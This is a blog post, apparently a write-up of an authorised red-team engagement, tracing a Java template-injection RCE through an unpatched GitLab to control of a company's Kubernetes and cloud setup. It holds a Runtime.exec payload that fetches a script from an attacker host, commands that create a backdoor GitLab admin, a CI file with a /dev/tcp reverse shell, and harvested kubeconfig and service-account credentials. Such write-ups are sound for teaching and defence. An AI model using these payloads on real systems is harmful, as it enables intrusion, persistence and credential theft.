---
layout: post
title:  "Red team: Journey from RCE to have total control of cloud infrastructure "
date:   2023-05-22 9:00:00 +0700
categories: red team
author: Quang Vo
tags: red-team, kubernetes
description: Journey from gaining RCE in a container to Cluster Admin and have completely control of company's cloud infrastructure
---

## Description
In my latest red team engagement for a very large fintech company, I found a RCE bug and landed in a very restricted docker container environment. I thought that was as far as I can go but after 2-3 days keep pushing and finding solutions to escape container, I succeeded and that path eventually leads me to Cluster Admin of their cloud environment.

To sum up, this is how it went:
- Attacker landed in a docker container by using RCE bug in a web application.
- The container image was very restricted, only `microdnf` was installed. 
- Attacker found that he have access to a whole different subnet within the container, and found Gitlab instance's IP address
- Attacker found Gitlab was unpatched and  vulnerable to CVE-2021-22205 
- Attacker gain access to Gitlab and Gitlab database, then attacker uses Gitlab admin permission to create a repo and create a CI/CD pipeline to move into Gitlab worker instances
- Within Gitlab worker's nodes, attacker found multiple secrets, files, API keys and **kubeconfig** included. 

More details below.


## 1. Finding the RCE bug in Java application

While pentesting the main application, I found an API endpoint

`POST https://redacted.com/v1/api/create`

This API is used for creating orders and payment in their system. Body data look like this

```json
{
"amount": "200",
"data": "",
"redirectUrl": ""
"orderInfo":"Could be anything"
"requestWith":"",
"signature":""
}
```

When playing around with different type of payloads, I tried the basic ones like SQLi, IDOR, XSS, .... but nothing work, until I tried this one `${7*7}`, a classic template injection and the back-end server response is very interesting.

Response from server:
```
{'responseTime': 109566832492, 'message': 'Bad format request.', 'resultCode': "x", 'subErrors': [{'field': 'signature', 'message': 'Invalid signature. Check raw signature before signed. Raw data before hash: accessKey=*****&amount=200&data=xxx&redirectUrl=https://c61sta92vtc0000v26yggdyh7feyyyyyb.interactsh.com&orderId=random-idf&orderInfo=49'}]}
```

`orderInfo=49`, that's what the server give back when I put `${7*7}` in `orderInfo` field, so not only we can confirm that the back-end server is vulnerable to template injection bug, we can also see result of our input from the response of the server, feels like hitting a jackpot at this point. 

With all the homework that I've done on the client's assets, as well as client's infrastructure, I know that the majorities of their web application assets are Java web application. So I used this exploit payload to gain a reverse shell on client system:
```java
${''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('curl <attacker_host:attacker_port>/backup.sh -o /tmp/backup.sh')
```

Server response:
```
{'responseTime': 1679566832492, 'message': 'Bad format request.', 'resultCode': "x", 'subErrors': [{'field': 'signature', 'message': 'Invalid signature. Check raw signature before signed. Raw data before hash: accessKey=*****&amount=2000&data=xxx&redirectUrl=https://c61sta92vtc0000v26yggdyh7feyyyyyb.interactsh.com&orderId=random-idf&orderInfo=start Process[pid=4024, exitValue="not exited"]'}]}
```

You can see the `Process[pid=4024, exitValue="not exited"]` , which indicates that the I have successfully create another Process and executes the command

## 2. Enumerate network and pivot to Gitlab instance

### 2.1 Enumerate network
After doing some basic enumeration of the client's environment that I just landed on, I found out that I'm in a very re-stricted environment ( within kubernetes ). With very limited access.

Network interface access:

![image](https://github.com/mr-r3bot/mr-r3bot.github.io/assets/37280106/c42b4c58-25e7-41b3-b6c4-a3b04aeb05b5)


Explore listening ports in back-end system:
![image](https://github.com/mr-r3bot/mr-r3bot.github.io/assets/37280106/951c7e67-8d45-4b5a-8182-fa1127ad3e63)



From here, I know that I can access to `172.16.x.x` subnet. By performing network scanning and vhost brute forcing, I found an interesting subdomain `https://gitlab.company-domain.com.vn` 

### 2.2 Exploiting gitlab instance

Knowing that gitlab instance have many CVEs before, but since as an attacker, I don't have gitlab account to access, so I need to find an unauthenticated code execution bug, I tried to use CVE-2021-22205 to exploit ( exploit script: 
https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

Here, I have successfully compromised Gitlab instance:

![image](https://github.com/mr-r3bot/mr-r3bot.github.io/assets/37280106/c2866e65-04bf-4844-9ac8-890a6e934928)

Now I have a control over 2 targets: the web server and gitlab instance, but I still cannot have a stable foothold inside company's infrastructure.

Having control over gitlab instance and gitlab's database are every attacker's dream, if you know about CI/CD and their configuration, you will know that Gitlab CI/CD pipeline is a low-hanging fruit inside any company's infra. 

Because of the nature of CI/CD pipeline, Gitlab will requires devops engineer to put in secrets such as Google service accounts with high permissions or a lot of important secret keys. During CI/CD process, it will needs to spawn a new pod to pull the image of source code to run tests, or any kind of devops operation that are configured. In order to spawn a new pod, a secret key or a service account with high permission in Kubernetes environment will need to be configured. And if they are not stored securely, once an attacker compromised CI/CD pipeline, he/she can have access to a lot of sensitive data

With that knowledge, I'm aiming to gain access in Gitlab worker instances

## 3. Abuse Gitlab CI/CD pipeline to gain access to Gitlab worker 

Gaining access to Gitlab database by rails console:
```bash
gitlab-rails console
```

After I'm in `gitlab-rails console` , I checked for the gitlab settings and found out that the option `password_authentication_enabled_for_web: false`, this mean that the basic authentication (username and password ) is disabled, they are configured to only login via SSO. 

This is gonna be a big problem for me. Why ?. 

While I still having access to the web server by exploiting the RCE bug, this does not mean that I have a stable foothold in the target because of nature of kubernetes, pods are just spawn and die depends on their scaling configuration, so I cannot install any kind of persistence on the target.

Pivoting to Gitlab instance is a good start, but with the default `git` user in the system, I also cannot install any kind of persistence on the target because `git` user have a very limited permission in the system.  So where to go from here ? 

After researching a few days for different methods to maintain access, I found out that one of the best way to maintain access on the target is by abusing gitlab CI/CD pipeline, we can create a cron job in gitlab and have it execute any scripts that we put in `.gitlab-ci.yml` file. 

Remember that the basic authentication option is disabled, while we can create a new user with admin permission, we cannot login to gitlab. Then I found this amazing [blog post](https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/gitlab#gitlab-rails) , turn out we can edit `password_authentication_enabled_for_web` to `true` to enable basic authentication. 

With that knowledge and having access to gitlab's database, the attacker do the following steps to gain access to gitlab CI/CD pipeline:
- Create a new user with admin permission 
```ruby
irb(main):003:0 > user = User.create(:username => 'snovvcrash', :password => 'Passw0rd!', :password_confirmation => 'Passw0rd!', :admin => true, :name => 'snovvcrash', :email => 'snovvcrash@megacorp.local')
```
- Login to Gitlab by the admin account just created ( by enable: `password_authentication_enabled_for_web: true` )
```ruby
Gitlab::CurrentSettings.update!(password_authentication_enabled_for_web: true)
```
- Create a repository
- Setup a pipeline CI/CD
- Inject bash script to file `.gitlab-ci.yml` , especially the `before_script` hook

**All the action above can be achived by calling Gitlab REST API with admin token**

*.gitlab-ci.yml*
```yaml
image: ubuntu:latest

  

before_script:

- bash -i >& /dev/tcp/${host}/${port} 0>&1

after_script:

- echo "After script section"

- echo "For example you might do some cleanup here"

deploy1:

stage: deploy

script:

- echo "Do your deploy here"
```


When the pipeline is triggered, I will gain access to gitlab worker:

![image](https://github.com/mr-r3bot/mr-r3bot.github.io/assets/37280106/b8f54dcd-b69d-4e5b-9720-0480cc7a3ac8)

After having a stable foothold inside the target, I start to enumerate the environment and looking for sensitive data. First thing I tried was `$ env` , and to my surprises, all the sensitive data are stored in environment variables.

By extracting env variables in this pod, I was able to gain access to everything in Kubernetes environment, that including:
- Kubeconfig file
- Docker auth file
- gcloud spinaker service account


```
GCR_PUSH_KEY={
      "type": "service_account",
      "project_id": "redacted",
      "private_key_id": "redactedxxxx",
      "private_key": "xxxxx",
      "client_email": "spinnaker-gcs-account@redactedt.iam.gserviceaccount.com",
      "client_id": "redacted",
      "auth_uri": "https://accounts.google.com/o/oauth2/auth",
      "token_uri": "https://oauth2.googleapis.com/token",
      "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
      "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/spinnaker-gcs-account%40redacted.iam.gserviceaccount.com"
}
```

```yaml
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: xxx
    server: https://redacted/k8s/clusters/c-6vzqn
  name: spinnaker-prod
contexts:
- context:
    cluster: spinnaker-prod
    user: spinnaker-prod
  name: spinnaker-prod
current-context: spinnaker-prod
kind: Config
preferences: {}
users:
- name: spinnaker-prod
  user:
    token: kubeconfig-u-59lxx.c-6vzqn:gvwcmcs9rnpkwknb99s5c9b2pdtqkmtlplf5ppndl6pxc7k6slnkkg

```


Gaining access to Google Container Registry:

```bash
$ gcloud auth activate-service-account spinnaker-gcs-account@redacted.iam.gserviceaccount.com --key-file=GCR_PUSH_KEY-serviceaccount.json                                          
$ Activated service account credentials for: [spinnaker-gcs-account@redacted.iam.gserviceaccount.com]
```


```bash
gcloud container images list --repository=redacted
```

And just like that, I was able to have total control of client's cloud infrastructure

## 4. Escaping to worker nodes and finding the RCE's root cause

After gaining access to Kubeconfig file, it's pretty easy to escape to worker node. All we need to do is to create a priviledged pod and from there we can escape to worker node, there are many different methods to escape from container when we are in priviledged one. I used the [mount c-group method](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

Further exploring to client's assets are out of scoped, so I reported to the client after gaining access to Kubernetes worker nodes and ask for permissions if I can clone or exfil source code of the vulnerable web application to understand the root cause of the template injection bugs, luckily they were okay about that so I can have a better understanding of what happened. 

To my surprises, it was not a 100% template injection bug like I thought, it was a **Bean validation** bug,  the vulnerable code look like this:

```java
@Override
    public boolean isValid(String object, ConstraintValidatorContext constraintContext) {
        if ( object == null ) {
            return true;
        }

        boolean isValid;
        String message = object;
        if ( caseMode == CaseMode.UPPER ) {
            isValid = object.equals( object.toUpperCase() );
            message = message + " should be in upper case." 
        }
        else {
            isValid = object.equals( object.toLowerCase() );
            message = message + " should be in lower case." 
        }

        if ( !isValid ) {
            constraintContext.disableDefaultConstraintViolation();
	            constraintContext.buildConstraintViolationWithTemplate(message)
            .addConstraintViolation();
```

Because I can control of the variable `message`, I can inject payload into `buildConstraintViolationWithTemplate()` function which will finally got evaluated and result in remote code execution

You can find more details about this [bug here](https://securitylab.github.com/research/bean-validation-RCE/)

